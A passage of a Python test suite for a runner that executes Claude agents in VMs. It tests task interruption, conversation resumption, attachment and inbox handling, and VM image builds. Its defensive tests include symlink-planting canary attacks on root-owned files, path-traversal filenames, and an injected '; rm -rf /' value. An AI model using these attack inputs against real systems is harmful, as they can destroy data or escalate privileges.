        self.assertEqual(open(os.path.join(self.d, "claude-calls")).read().splitlines()[-1], "--continue -p")
        self.assertEqual(sent[-1]["state"], "done")
        self.assertEqual(self.r.load_state(), {"conversation": {repo: True}, "interrupted": {}})

    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_a_conversation_left_broken_starts_anew(self):
        gc, _ = self._origin()
        self.claude, self.runs = self._fake_claude(), 0
        open(os.path.join(self.d, "slow"), "w").close()
        self._task(gc, "t1", interrupt="claude")
        os.unlink(os.path.join(self.d, "slow"))
        open(os.path.join(self.d, "broken"), "w").close()
        sent, _, _ = self._task(gc, "t2", cont=True)
        self.assertEqual(open(os.path.join(self.d, "claude-calls")).read().splitlines()[-2:], ["--continue -p", "-p"])
        notes = [e["text"] for m in sent if m.get("type") == "chat" for e in m["events"] if e["k"] == "status"]
        self.assertEqual(notes, ["The conversation you stopped couldn't continue, so this is a new one."])
        self.assertEqual(sent[-1]["state"], "done")
        # a continue that fails when you didn't stop anything is just a failure: no second run
        sent, _, _ = self._task(gc, "t3", cont=True)
        self.assertEqual(open(os.path.join(self.d, "claude-calls")).read().splitlines()[-1], "--continue -p")

    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_interrupt_while_pushing_lets_the_push_finish(self):
        gc, git_origin = self._origin()
        self.claude, self.runs = self._fake_claude(), 0
        sent, acks, _ = self._task(gc, "t1", interrupt="push")
        self.assertEqual([a["result"] for a in acks], ["finishing"])  # Claude was already done
        self.assertEqual(sent[-1]["state"], "done", sent)
        self.assertEqual(git_origin("show", "agent/x:new.txt"), "made\n")

    def _through_worker(self, gc, tid, cont=False, on_send=None, wrap=None):
        """One task through start_task, the way the runner's main loop starts it."""
        r, sent = self.r, []

        class Ctl:
            def send(self, **m):
                sent.append(m)
                if on_send:
                    on_send(m)
        task = {"id": tid, "branch": "agent/x", "instructions": "work", "env": {"GH_TOKEN": "t"},
                "agent_argv": [self.claude, "-p", "{instructions}"], "continue": cont, "continue_args": ["--continue"],
                "commit_exclude": [".claude"]}
        with mock.patch.object(r, "GLOBAL_GITCONFIG", gc), mock.patch.object(r, "kill_agent_processes", lambda: None), \
                mock.patch.object(r, "open_pr", lambda *a: "https://github.com/me/repo/pull/2"), \
                mock.patch.object(r, "run_as_agent", wrap(r.run_as_agent) if wrap else r.run_as_agent):
            start = time.time()
            th = r.start_task({"repo": "me/repo", "identity": {}}, task, Ctl())
            th.join(30)
        self.assertFalse(th.is_alive())
        return sent, time.time() - start

    def _ack(self, tid, out):
        class Ctl:
            def send(self, **m):
                out.append(m["result"])
        self.r.interrupt_task({"task": tid}, Ctl())

    def calls(self):
        path = os.path.join(self.d, "claude-calls")
        if not os.path.exists(path):
            return []
        with open(path) as f:
            return f.read().splitlines()

    def test_the_file_cache_is_dropped_after_each_task_never_during_one(self):
        r, during = self.r, []
        knob = os.path.join(self.d, "drop_caches")

        def task(boot, t, ctl):
            during.append(os.path.exists(knob))
            if t["id"] == "t2":
                raise RuntimeError("the clone failed")

        class Ctl:
            def send(self, **m):
                pass
        with mock.patch.object(r, "DROP_CACHES", knob), mock.patch.object(r, "run_scratch_task", task):
            for tid in ("t1", "t2"):
                if os.path.exists(knob):
                    os.remove(knob)
                r.start_task({}, {"id": tid}, Ctl()).join(10)
                with open(knob) as f:
                    self.assertEqual(f.read(), "1")
        self.assertEqual(during, [False, False])
        r.drop_file_cache()  # not root, or no /proc: logged, never fatal
        self.assertFalse(r.TASK_BUSY.locked())

    def test_the_cache_is_dropped_before_the_final_status(self):
        """The panel sends the next queued task as soon as it sees the final status: the drop comes first."""
        r, order = self.r, []

        class Ctl:
            def send(self, **m):
                order.append(f"{m['type']} {m.get('state')}")

        def scratch(boot, task, ctl):
            ctl.send(type="status", task=task["id"], state="running")
            ctl.send(type="status", task=task["id"], state="done")
        with mock.patch.object(r, "run_scratch_task", scratch), \
                mock.patch.object(r, "drop_file_cache", lambda: order.append("drop")):
            r.start_task({}, {"id": "t1"}, Ctl()).join(10)
        self.assertEqual(order, ["status running", "drop", "status done"])
        self.assertFalse(r.TASK_BUSY.locked())

    def test_a_task_ends_with_summary_then_cache_drop_then_final_status_then_release(self):
        r, order = self.r, []

        class Ctl:
            def send(self, **m):
                order.append(f"{m['type']} {m.get('state') or m.get('text')}")

        class Lock:
            lock = threading.Lock()

            def acquire(self, *a, **k):
                return self.lock.acquire(*a, **k)

            def release(self):
                order.append("release")
                self.lock.release()

            def locked(self):
                return self.lock.locked()

        def scratch(boot, task, ctl):
            ctl.send(type="status", task=task["id"], state="done")
        with mock.patch.object(r, "TASK_BUSY", Lock()), mock.patch.object(r, "run_scratch_task", scratch), \
                mock.patch.dict(r.SUMMARY_SENT, text=None), \
                mock.patch.object(r, "as_agent", lambda *a, **k: "Done, nothing left"), \
                mock.patch.object(r, "drop_file_cache", lambda: order.append("drop")):
            r.start_task({}, {"id": "t1"}, Ctl()).join(10)
        self.assertEqual(order, ["summary Done, nothing left", "drop", "status done", "release"])

    def test_a_running_task_gets_busy_at_once_and_an_ended_one_hands_over(self):
        r, sent, second = self.r, [], {}

        class Ctl:
            def send(self, **m):
                sent.append(m)
                if m.get("type") == "status" and m.get("task") == "t1" and m.get("state") == "done":
                    th = threading.Thread(target=lambda: second.update(th=r.start_task({}, {"id": "t2"}, self)))
                    th.start()  # the control loop, sending the next queued task the moment it sees this
                    second["starter"] = th
        hold = threading.Event()

        def scratch(boot, task, ctl):
            if task["id"] == "t1":
                hold.wait(10)
                ctl.send(type="status", task="t1", state="done")
        with mock.patch.object(r, "run_scratch_task", scratch), mock.patch.object(r, "drop_file_cache", lambda: time.sleep(0.3)):
            first = r.start_task({}, {"id": "t1"}, Ctl())
            started = time.time()
            self.assertIsNone(r.start_task({}, {"id": "t0"}, Ctl()))  # t1 is really running
            self.assertLess(time.time() - started, 1)  # the control loop isn't held up
            hold.set()
            first.join(10)
            second["starter"].join(10)
            second["th"].join(10)
        self.assertEqual([m for m in sent if m.get("error") == "agent is busy"],
                         [{"type": "status", "task": "t0", "state": "failed", "error": "agent is busy"}])
        self.assertIsNotNone(second["th"])

    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_the_next_task_after_an_interrupt_runs_claude(self):
        gc, _ = self._origin()
        self.claude = self._fake_claude()
        open(os.path.join(self.d, "slow"), "w").close()
        acks = []

        def interrupt_once_working(m):
            if m.get("type") == "chat" and not acks:
                threading.Timer(0.3, self._ack, ("t1", acks)).start()
        sent, took = self._through_worker(gc, "t1", on_send=interrupt_once_working)
        self.assertEqual((acks, sent[-1]["state"]), (["stopping"], "interrupted"))
        self.assertLess(took, 20)
        os.unlink(os.path.join(self.d, "slow"))
        sent, _ = self._through_worker(gc, "t2", cont=True)
        self.assertEqual(sent[-1]["state"], "done", sent)
        self.assertEqual(len(self.calls()), 2)  # its Claude run started, and ran to the end
        self._ack("t2", acks)
        self.assertEqual(acks[-1], "idle")  # once a task is over, nothing is running

    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_an_interrupt_during_the_clone_keeps_claude_from_starting(self):
        gc, _ = self._origin()
        self.claude, acks = self._fake_claude(), []

        def wrap(real):
            def run(argv, *a, **kw):
                if "clone" in argv:
                    self._ack("t1", acks)
                return real(argv, *a, **kw)
            return run
        sent, _ = self._through_worker(gc, "t1", wrap=wrap)
        self.assertEqual(acks, ["stopping"])
        self.assertEqual(self.calls(), [])  # the clone finished, Claude never started
        self.assertEqual((sent[-1]["state"], sent[-1]["agent_rc"]), ("interrupted", None))

    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_an_interrupt_as_claude_starts_ends_it(self):
        gc, _ = self._origin()
        self.claude, acks = self._fake_claude(), []
        open(os.path.join(self.d, "slow"), "w").close()
        real_popen = self.r.subprocess.Popen

        def popen(argv, *a, **kw):
            if argv[0] == self.claude:
                self._ack("t1", acks)  # after the check before starting, before the run is registered
            return real_popen(argv, *a, **kw)
        with mock.patch.object(self.r.subprocess, "Popen", popen):
            sent, took = self._through_worker(gc, "t1")
        self.assertEqual((acks, sent[-1]["state"]), (["stopping"], "interrupted"))
        self.assertLess(took, 20)  # ended at once, not after the fake's 30 seconds

    def test_an_interrupt_before_the_task_thread_runs_finds_it(self):
        r, acks, started = self.r, [], []

        class Held:  # the thread is made but hasn't run yet
            def __init__(self, target, args, daemon):
                pass

            def start(self):
                started.append(1)
        try:
            with mock.patch.object(r.threading, "Thread", Held):
                r.start_task({}, {"id": "t1"}, None)
            self._ack("t1", acks)
        finally:
            r.TASK_RUN.clear()
            r.TASK_BUSY.release()
        self.assertEqual((started, acks), ([1], ["stopping"]))

    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_an_interrupt_before_the_retry_keeps_it_from_running(self):
        gc, _ = self._origin()
        self.claude, acks = self._fake_claude(), []
        open(os.path.join(self.d, "slow"), "w").close()
        self._through_worker(gc, "t1", on_send=lambda m: m.get("type") == "chat" and not acks
                             and threading.Timer(0.3, self._ack, ("t1", acks)).start())
        os.unlink(os.path.join(self.d, "slow"))
        open(os.path.join(self.d, "broken"), "w").close()
        acks.clear()

        def between_the_runs(m):  # the failed --continue's output, sent as its run ends
            if m.get("type") == "chat" and "No conversation" in str(m) and not acks:
                self._ack("t2", acks)
        sent, _ = self._through_worker(gc, "t2", cont=True, on_send=between_the_runs)
        self.assertEqual(acks, ["stopping"])
        self.assertEqual(self.calls()[-1], "--continue -p")  # no second run after you stopped it
        notes = [e["text"] for m in sent if m.get("type") == "chat" for e in m["events"] if e["k"] == "status"]
        self.assertEqual(notes, [])  # so no "couldn't continue" either
        self.assertEqual(sent[-1]["state"], "interrupted")

    def test_interrupt_with_nothing_running(self):
        r, acks = self.r, []

        class Ctl:
            def send(self, **m):
                acks.append(m)
        r.interrupt_task({"task": "t1"}, Ctl())
        r.TASK_RUN.update(id="t2", claude_over=False)
        try:
            r.interrupt_task({"task": "t1"}, Ctl())  # another task than the one running
        finally:
            r.TASK_RUN.clear()
        self.assertEqual(acks, [{"type": "interrupt_ack", "task": "t1", "result": "idle"}] * 2)
        self.assertFalse(r.interrupted())

    def test_load_state_keeps_only_the_expected_shape(self):
        os.makedirs(os.path.join(self.d, ".claude"))
        for content, want in (('{"conversation": ["x"]}', {}), ('[1]', {}), ('{"conversation": {"/a": true, "/b": 5}}',
                                                                              {"/a": True})):
            with open(os.path.join(self.d, ".claude", "cilly-state.json"), "w") as f:
                f.write(content)
            self.assertEqual(self.r.load_state(), {"conversation": want, "interrupted": {}})
        with open(os.path.join(self.d, ".claude", "cilly-state.json"), "w") as f:
            f.write('{"conversation": {"/a": true}, "interrupted": {"/a": true, "/b": "yes", "/c": [1]}}')
        self.assertEqual(self.r.load_state(), {"conversation": {"/a": True}, "interrupted": {"/a": True}})

    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_attach_refuses_empty_repo(self):
        origin = os.path.join(self.d, "origin.git")
        subprocess.run(["git", "init", "-q", "--bare", origin], check=True)
        gc = os.path.join(self.d, "gitconfig")
        with open(gc, "w") as f:
            f.write(f'[url "file://{origin}"]\n\tinsteadOf = https://github.com/me/repo.git\n')
        os.makedirs(os.path.join(self.d, "scratch"))

        class Ctl:
            def send(self, **m):
                pass
        with mock.patch.object(self.r, "GLOBAL_GITCONFIG", gc), self.assertRaisesRegex(RuntimeError, "empty"):
            self.r.run_attach({"identity": {}}, {"id": "t9", "repo": "me/repo", "branch": "agent/x-1",
                                                 "env": {}}, Ctl())

    def test_attachments_land_read_only_and_checked(self):
        import base64
        import hashlib
        dest, staging = os.path.join(self.d, "attachments"), os.path.join(self.d, "staging")
        with mock.patch.object(self.r, "ATTACH_DIR", dest), mock.patch.object(self.r, "ATTACH_STAGING", staging):
            at = self.r.Attachments()
            data = os.urandom(1000)
            for i, part in enumerate((data[:600], data[600:])):
                at.chunk({"set": "s1", "name": "shot.png", "seq": i, "data": base64.b64encode(part).decode()})
            at.end({"set": "s1", "name": "shot.png", "chunks": 2, "sha256": hashlib.sha256(data).hexdigest()})
            p = os.path.join(dest, "s1", "shot.png")
            with open(p, "rb") as f:
                self.assertEqual(f.read(), data)
            self.assertEqual(os.stat(p).st_mode & 0o777, 0o444)
            # wrong hash: dropped
            at.chunk({"set": "s1", "name": "bad", "seq": 0, "data": base64.b64encode(b"abc").decode()})
            at.end({"set": "s1", "name": "bad", "chunks": 1, "sha256": "0" * 64})
            # unsafe names and set ids: ignored
            for m in ({"set": "s1", "name": "../x"}, {"set": "../s", "name": "x"}, {"set": "s1", "name": "a/b"}):
                at.chunk(dict(m, seq=0, data=base64.b64encode(b"x").decode()))
                at.end(dict(m, chunks=1, sha256=hashlib.sha256(b"x").hexdigest()))
            self.assertEqual(sorted(os.listdir(os.path.join(dest, "s1"))), ["shot.png"])
            self.assertEqual(os.listdir(staging), [])
            self.assertFalse(os.path.exists(os.path.join(self.d, "x")))

    def test_every_name_the_panel_sends_lands(self):
        """The panel's names for attachments and project files are ones this runner accepts: it drops others."""
        import base64
        import hashlib
        import string
        from cilly import projects as PJ
        dest, staging = os.path.join(self.d, "attachments"), os.path.join(self.d, "staging")
        names = ["bedrock-toast-handoff(1).md", "BedrockClicks-1.0.0(1).jar", "Übersicht (v2).md", "😀.png", " -x ",
                 ".hidden", "a\tb", "x" * 300] + [f"a{c}b.txt" for c in string.printable]
        sent = {n: PJ.vm_file_name(n) for n in names}
        self.assertEqual(sent["bedrock-toast-handoff(1).md"], "bedrock-toast-handoff_1_.md")
        with mock.patch.object(self.r, "ATTACH_DIR", dest), mock.patch.object(self.r, "ATTACH_STAGING", staging):
            at = self.r.Attachments()
            for n in sorted({v for v in sent.values() if v}):
                at.chunk({"set": "s1", "name": n, "seq": 0, "data": base64.b64encode(b"x").decode()})
                at.end({"set": "s1", "name": n, "chunks": 1, "sha256": hashlib.sha256(b"x").hexdigest()})
                self.assertTrue(os.path.isfile(os.path.join(dest, "s1", n)), n)
        project = PJ.ProjectStore(os.path.join(self.d, "projects.json"), os.path.join(self.d, "pfiles"))
        pid = project.create("p")["id"]
        for n in ("Guide (v2).md", "notes(1).txt"):
            self.assertTrue(self.r._SAFE_NAME.match(project.add_file(pid, n, b"x")["files"][-1]["name"]), n)

    def test_requests_are_sent_and_archived(self):
        req = os.path.join(self.d, "requests")
        os.makedirs(req)
        with open(os.path.join(req, "tables.md"), "w") as f:
            f.write("How do tables render?")
        with open(os.path.join(req, "notes.txt"), "w") as f:
            f.write("ignored: not .md")
        sent = []

        class Ctl:
            def send(self, **m):
                sent.append(m)
        self.r.send_research_requests({"id": "t1"}, Ctl())
        self.assertEqual(sent[0]["requests"], [{"name": "tables", "text": "How do tables render?"}])
        self.assertEqual(os.listdir(req), [])
        self.assertTrue(os.path.exists(os.path.join(self.d, "sent", "requests-t1", "tables.md")))

    def test_inbox_written_read_only_and_safely(self):
        inbox = os.path.join(self.d, "inbox")
        with mock.patch.object(self.r, "INBOX", inbox):
            self.r.write_inbox({"id": "ab12cd34", "title": "Q?", "files": [
                {"path": "f.md", "content": "answer"}, {"path": "../../escape.md", "content": "no"},
                {"path": "sub/g.md", "content": "more"}]})
            self.r.write_inbox({"id": "../x", "files": [{"path": "a.md", "content": "no"}]})
        root = os.path.join(inbox, "ab12cd34")
        self.assertEqual(sorted(os.listdir(root)), ["REQUEST.md", "f.md", "sub"])
        self.assertFalse(os.path.exists(os.path.join(self.d, "escape.md")))
        self.assertEqual(os.stat(os.path.join(root, "f.md")).st_mode & 0o777, 0o444)
        self.assertEqual(os.listdir(inbox), ["ab12cd34"])
        for dp, _, _ in os.walk(root):
            os.chmod(dp, 0o755)  # let tempdir cleanup work


@unittest.skipUnless(os.getuid() == 0, "needs root to switch to a real unprivileged user")
class RootNeverFollowsAgentSymlinksTests(unittest.TestCase):
    """The audit's canary test: the agent plants symlinks to root-owned files
    in its home; the runner's own file work there must not touch them."""

    def setUp(self):
        self.r = load_runner()
        self.tmp = tempfile.TemporaryDirectory()
        self.d = os.path.realpath(self.tmp.name)
        os.chmod(self.d, 0o755)
        self.home = os.path.join(self.d, "home")
        os.makedirs(os.path.join(self.home, ".claude"))
        self.canary = os.path.join(self.d, "canary")
        os.makedirs(self.canary, mode=0o755)
        self.canary_file = os.path.join(self.canary, "secret")
        with open(self.canary_file, "w") as f:
            f.write("root only")
        os.chmod(self.canary_file, 0o600)
        nobody = pwd.getpwnam("nobody")
        for dirpath, dirnames, filenames in os.walk(self.home):
            for n in [dirpath] + [os.path.join(dirpath, x) for x in dirnames + filenames]:
                os.lchown(n, nobody.pw_uid, nobody.pw_gid)
        self.pw = pwd.struct_passwd(("agent", "x", nobody.pw_uid, nobody.pw_gid, "", self.home, "/bin/sh"))
        self.p = [mock.patch.object(self.r.pwd, "getpwnam", lambda n: self.pw),
                  mock.patch.object(self.r, "log", lambda m: None)]
        for x in self.p:
            x.start()

    def tearDown(self):
        for x in self.p:
            x.stop()
        self.tmp.cleanup()

    def plant(self, rel, target):
        path = os.path.join(self.home, rel)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        os.symlink(target, path)
        os.lchown(path, self.pw.pw_uid, self.pw.pw_gid)

    def assert_canary_untouched(self):
        st = os.stat(self.canary_file)
        self.assertEqual((st.st_uid, st.st_mode & 0o777), (0, 0o600))
        self.assertEqual(os.stat(self.canary).st_uid, 0)
        with open(self.canary_file) as f:
            self.assertEqual(f.read(), "root only")

    def test_state_file_symlink(self):
        state = {"conversation": {"/home/agent/work/repo": True}, "interrupted": {"/home/agent/work/repo": True}}
        self.plant(".claude/cilly-state.json", self.canary_file)
        self.r.save_state(state)  # the link is replaced, never followed
        self.assert_saved(state)
        for plant in ("symlink", "fifo"):  # and the temp name it writes through first
            tmp = os.path.join(self.home, ".claude", "cilly-state.json.tmp")
            if plant == "symlink":
                self.plant(".claude/cilly-state.json.tmp", self.canary_file)
            else:
                os.mkfifo(tmp)
                os.lchown(tmp, self.pw.pw_uid, self.pw.pw_gid)
            t0 = time.time()
            self.r.save_state(state)
            self.assertLess(time.time() - t0, 10, plant)
            self.assert_saved(state)

    def assert_saved(self, state):
        path = os.path.join(self.home, ".claude", "cilly-state.json")
        st = os.lstat(path)
        self.assertTrue(stat.S_ISREG(st.st_mode))
        self.assertEqual(st.st_uid, self.pw.pw_uid)
        self.assertEqual(self.r.load_state(), state)
        self.assert_canary_untouched()

    def test_work_dir_symlinks(self):
        for name in ("scratch", "work", "outbox", "research"):
            self.plant(name, self.canary)
        for name in ("scratch", "work", "outbox", "research"):
            self.r.ensure_agent_dir(os.path.join(self.home, name))
        self.assert_canary_untouched()

    def test_archive_and_reads_through_symlinks(self):
        self.plant("outbox", self.canary)
        self.plant("sent", self.canary)
        self.assertEqual(self.r.collect_text_files(os.path.join(self.home, "outbox"), 10000, 10000), [])
        try:
            self.r._archive(os.path.join(self.home, "outbox"), "t1")
        except RuntimeError:
            pass  # refused: fine
        self.plant("requests", self.canary)
        sent = []

        class Ctl:
            def send(self, **m):
                sent.append(m)
        try:
            self.r.send_research_requests({"id": "t2"}, Ctl())
        except RuntimeError:
            pass
        self.assertEqual(sent, [])
        self.assert_canary_untouched()
        self.assertEqual(sorted(os.listdir(self.canary)), ["secret"])

    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_repo_config_symlink(self):
        repo = os.path.join(self.home, "work", "repo")
        os.makedirs(repo)
        for p in (os.path.join(self.home, "work"), repo):
            os.chown(p, self.pw.pw_uid, self.pw.pw_gid)
        self.plant("work/repo/.git", self.canary)
        try:
            self.r.sanitize_repo_config(repo, "https://github.com/me/repo.git")
        except RuntimeError:
            pass
        self.assertEqual(sorted(os.listdir(self.canary)), ["secret"])
        self.assert_canary_untouched()

    def test_export_and_memory_pack_skip_root_files(self):
        self.plant("scratch/leak", self.canary_file)
        self.plant(".claude/CLAUDE.md", self.canary_file)
        p = self.r.agent_popen("pack_dir", os.path.join(self.home, "scratch"), False)
        data = p.stdout.read()
        self.r.agent_finish(p, "pack_dir")
        self.assertNotIn(b"root only", data)
        p = self.r.agent_popen("pack_memory", os.path.join(self.home, ".claude"))
        data = p.stdout.read()
        self.r.agent_finish(p, "pack_memory")
        self.assertNotIn(b"root only", data)

    def test_the_home_folder_is_packed_as_the_agent(self):
        """Packed by the agent user: a root-only file planted in its home doesn't travel."""
        self.plant("scratch/leak", self.canary_file)
        p = self.r.agent_popen("pack_home", self.home)
        data = p.stdout.read()
        self.r.agent_finish(p, "pack_home")
        self.assertNotIn(b"root only", data)


class HelperPrivilegeTests(unittest.TestCase):
    def test_helpers_drop_to_the_agent_user(self):
        r = load_runner()
        pw = pwd.struct_passwd(("agent", "x", 1000, 1000, "", "/home/agent", "/bin/sh"))
        calls = []

        def fake_run(argv, **kw):
            calls.append(kw)
            return subprocess.CompletedProcess(argv, 0, b"null", b"")
        with mock.patch.object(r.pwd, "getpwnam", lambda n: pw), mock.patch.object(r.subprocess, "run", fake_run):
            r.as_agent("mkdirs", ["/home/agent/x"])
        self.assertEqual((calls[0]["user"], calls[0]["group"], calls[0]["extra_groups"]), (1000, 1000, []))
        self.assertEqual(calls[0]["cwd"], "/")
        self.assertNotIn("GH_TOKEN", calls[0]["env"])

    def test_the_helper_program_fits_in_one_argument(self):
        """Linux takes at most 128 KiB in one argument, and the runner passed itself with -c.  It's
        compressed now, with room to grow, and runs as the same program."""
        r = load_runner()
        src = r._self_source()
        self.assertLess(len(src.encode()), 96 * 1024)
        out = subprocess.run([sys.executable, "-I", "-c", src, r.HELPER_FLAG, "has_session", json.dumps(["--help"])],
                             capture_output=True, text=True, check=True, timeout=30)
        self.assertEqual(out.stdout, "false")  # a helper ran, and answered
        # a failing helper's traceback stays short: a long one fills stderr while the runner reads stdout
        out = subprocess.run([sys.executable, "-I", "-c", src, r.HELPER_FLAG, "read_file", json.dumps(["/nonexistent", "x", 1])],
                             capture_output=True, timeout=30)
        self.assertEqual(out.returncode, 1)
        self.assertLess(len(out.stderr), 4096)
        self.assertIn(b"_h_read_file", out.stderr)

    def test_no_root_file_ops_on_agent_paths(self):
        """Every chown/move/rename in the runner is in a helper or on a root-owned path."""
        import ast
        with open(RUNNER) as f:
            tree = ast.parse(f.read())
        allowed = {"setup_inject", "_write_root_file", "apply_policy", "write_gitconfig", "write_inbox",
                   "restore_memory", "maybe_reexec_newer_runner",
                   "install_ca", "_save_plugins_file", "_save_skills_file"}  # root-owned paths (/etc, /inject, /inbox, /run, /usr/local/share/ca-certificates, /var/lib/cilly)
        for fn in tree.body:
            if not isinstance(fn, ast.FunctionDef) or fn.name.startswith("_h_") or fn.name in allowed:
                continue
            for node in ast.walk(fn):
                if isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute) and \
                        isinstance(node.func.value, ast.Name) and node.func.value.id in ("os", "shutil") and \
                        node.func.attr in ("chown", "lchown", "move", "rename", "replace", "rmtree", "makedirs"):
                    self.fail(f"{fn.name} calls {node.func.attr} as root")


class BaseImageTests(unittest.TestCase):
    def test_user_data_is_valid_cloud_config(self):
        from cilly import config as C
        from cilly.base_image import user_data
        ud = user_data(C.DEFAULT_CONFIG)
        self.assertTrue(ud.startswith("#cloud-config\n"))
        doc = json.loads(ud.split("\n", 1)[1])  # JSON is valid YAML
        self.assertTrue(doc["ssh_pwauth"] is False)
        self.assertIn("/usr/local/sbin/cilly-runner", [w["path"] for w in doc["write_files"]])
        import base64
        finish = [w for w in doc["write_files"] if w["path"] == "/usr/local/sbin/cilly-build-finish"][0]
        script = base64.b64decode(finish["content"]).decode()
        self.assertIn("set -euo pipefail", script)
        self.assertIn("cloud-init.disabled", script)
        self.assertIn("command -v", script)
        self.assertTrue(script.rstrip().endswith("echo CILLY-BUILD-OK"))
        if shutil.which("bash"):
            r = subprocess.run(["bash", "-n"], input=script.encode(), capture_output=True)
            self.assertEqual(r.returncode, 0, r.stderr)
        self.assertNotIn("sudo", json.dumps(doc["users"]))
        self.assertNotIn("sudo", doc["packages"])
        self.assertIn("chmod ug-s", script)  # setuid/setgid bits stripped...
        self.assertIn('[ -z "$left" ]', script)  # ...and the build fails if any remain
        self.assertLess(script.index("chmod ug-s"), script.index("CILLY-BUILD-OK"))
        unit = [w for w in doc["write_files"] if w["path"] == "/etc/systemd/system/cilly-runner.service"][0]
        self.assertIn("NoNewPrivileges=yes", base64.b64decode(unit["content"]).decode())

    def test_images_boot_without_waiting(self):
        from cilly import config as C
        from cilly import vm as V
        from cilly.base_image import user_data
        import base64
        doc = json.loads(user_data(C.DEFAULT_CONFIG, ["java"]).split("\n", 1)[1])
        script = base64.b64decode(next(w for w in doc["write_files"] if w["path"].endswith("build-finish"))["content"]).decode()
        net = script.split("cat > /etc/systemd/network/05-cilly.network <<'NET'\n", 1)[1].split("\nNET\n", 1)[0]
        self.assertIn("Address=10.0.2.15/24", net)
        self.assertIn("Gateway=10.0.2.2", net)
        self.assertIn("DHCP=no", net)
        self.assertNotIn("DNS=", net)  # the VM looks nothing up: names go to the proxy
        resolved = next(w for w in doc["write_files"] if w["path"] == "/etc/systemd/resolved.conf.d/90-cilly.conf")
        self.assertIn("FallbackDNS=\n", resolved["content"])  # nor systemd's built-in public servers
        # that's the address QEMU's user network gives: no net= or host= of our own on the netdev
        argv = " ".join(V.qemu_argv(qemu="q", name="abcd1234", paths=V.VMPaths("/tmp/x", "/run/x"), cpus=1, memory_mb=512))
        self.assertIn("-netdev user,", argv)
        self.assertNotRegex(argv, r"user,[^ ]*\b(net|host|dhcpstart)=")
        self.assertIn("systemd-networkd-wait-online --any --timeout=20", script)
        self.assertIn("GRUB_TIMEOUT=0", script)
        self.assertIn("update-grub", script)
        timers = script.split("for timer in ", 1)[1].split("; do", 1)[0].split()
        self.assertIn("apt-daily", timers)
        self.assertIn("apt-listchanges", timers)  # it fetches changelogs from metadata.ftp-master.debian.org
        # after the toolchains' downloads, which still need the build's network as it was
        self.assertLess(script.index("cilly: toolchain java"), script.index("05-cilly.network"))
        self.assertLess(script.index("05-cilly.network"), script.index("CILLY-BUILD-OK"))

    def test_images_drop_only_what_agents_cant_use(self):
        from cilly import config as C
        from cilly.base_image import user_data
        import base64
        doc = json.loads(user_data(C.DEFAULT_CONFIG).split("\n", 1)[1])
        script = base64.b64decode(next(w for w in doc["write_files"] if w["path"].endswith("build-finish"))["content"]).decode()
        self.assertIn("rm -rf /var/lib/apt/lists/*", script)
        for kept in ("/usr/share/man", "/usr/share/doc", "/usr/share/locale"):  # nothing an agent reads goes
            self.assertNotIn(kept, script)
        self.assertRegex(script, r"fstrim -v / \|\| echo")  # a disk without discard makes a bigger image, not a failed build
        self.assertLess(script.index("apt-get clean"), script.index("fstrim"))  # after the last install wrote
        # and before the checks, which stay last (a test runs them on this machine)
        self.assertLess(script.index("fstrim"), script.index("chmod ug-s"))
        self.assertLess(script.index("fstrim"), script.index("if [ -d /opt ]"))

    def test_toolchain_recipes(self):
        from cilly import config as C
        from cilly.base_image import RECIPES, check_toolchains, user_data
        import base64
        doc = json.loads(user_data(C.DEFAULT_CONFIG, list(RECIPES)).split("\n", 1)[1])
        for t, r in RECIPES.items():
            for p in r["apt"]:
                self.assertIn(p, doc["packages"], t)
        script = base64.b64decode([w for w in doc["write_files"] if w["path"] == "/usr/local/sbin/cilly-build-finish"][0]
                                  ["content"]).decode()
        self.assertIn("sha256sum -c -", script)  # rustup-init is checked before it runs
        self.assertIn("javac 25", script)
        self.assertIn("toolchain go does not work", script)
        self.assertIn("playwright@1.63.0", script)  # pinned
        self.assertIn("playwright screenshot file:///tmp/pw-check.html", script)  # the browser really renders
        self.assertLess(script.index("toolchain rust"), script.index("chmod ug-s"))  # setuid strip runs last
        if shutil.which("bash"):
            r = subprocess.run(["bash", "-n"], input=script.encode(), capture_output=True)
            self.assertEqual(r.returncode, 0, r.stderr)
        plain = json.loads(user_data(C.DEFAULT_CONFIG).split("\n", 1)[1])
        self.assertNotIn("openjdk-25-jdk-headless", plain["packages"])
        with self.assertRaisesRegex(ValueError, "unknown toolchain"):
            check_toolchains(["java", "; rm -rf /"])
        self.assertEqual(check_toolchains(["rust", "rust"]), ["rust"])

    def test_every_recipe_is_pinned_and_checked(self):
        import base64
        import re
        from urllib.parse import urlparse
        from cilly import config as C
        from cilly.base_image import GUEST_DIR, PRESETS, RECIPES, check_toolchains, user_data
        keys = {"label", "about", "apt", "script", "check", "build_hosts", "needs", "downloads", "files", "optional", "size_mb"}
        for t, r in RECIPES.items():
            self.assertLessEqual(set(r), keys, t)
            self.assertTrue(r["label"] and r["about"] and r["check"], t)
            self.assertTrue(isinstance(r.get("size_mb"), int) and r["size_mb"] > 0, t)  # shown in Settings → VM images
            self.assertTrue(all(isinstance(c, str) and c.strip() for c in r["check"]), t)
            self.assertTrue(set(r.get("needs", [])) <= set(RECIPES) - {t}, t)
            for d in r.get("downloads", []):
                self.assertRegex(d["sha256"], r"^[0-9a-f]{64}$", t)
                self.assertRegex(d["version"], r"^[0-9][0-9A-Za-z.+_-]*$", t)
                self.assertIn(d["version"], d["url"], t)
                self.assertTrue(d["url"].startswith("https://") and d["to"].startswith("/opt/"), t)
                self.assertIn(urlparse(d["url"]).hostname, r["build_hosts"], t)  # build only; agents never get them
            for src in r.get("files", {}).values():
                self.assertTrue(os.path.isfile(os.path.join(GUEST_DIR, src)), src)
            text = json.dumps(r).lower()
            self.assertIsNone(re.search(r"latest|npx |@next\b", text), t)
        self.assertEqual(check_toolchains(["decompilers"]), ["java", "decompilers"])  # it needs Java
        self.assertEqual(check_toolchains(["java", "decompilers", "java"]), ["java", "decompilers"])
        self.assertIn("decompilers", PRESETS["full"]["toolchains"])
        self.assertNotIn("ghidra", PRESETS["full"]["toolchains"])  # large, so only when you ask for it
        self.assertEqual(check_toolchains(["ghidra"]), ["java", "ghidra"])
